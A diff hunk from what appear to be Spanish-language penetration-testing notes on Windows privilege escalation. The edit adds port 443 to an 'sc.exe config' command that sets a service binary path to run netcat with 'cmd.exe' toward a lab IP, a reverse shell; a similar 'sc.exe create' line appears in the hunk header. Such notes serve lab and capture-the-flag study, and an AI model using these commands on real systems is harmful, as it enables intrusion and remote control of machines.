@@ -1727,7 +1727,7 @@ sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10
 Para configurar un servicio ( no quiere decir que lo detengas o inicies)
 
 ```
-sc.exe config VMTools binPath="C:\Windows\Temp\privesc\nc64.exe -e cmd.exe 10.10.14.146"
+sc.exe config VMTools binPath="C:\Windows\Temp\privesc\nc64.exe -e cmd.exe 10.10.14.146 443"
 ```
 
 Para iniciar o parar un servicio
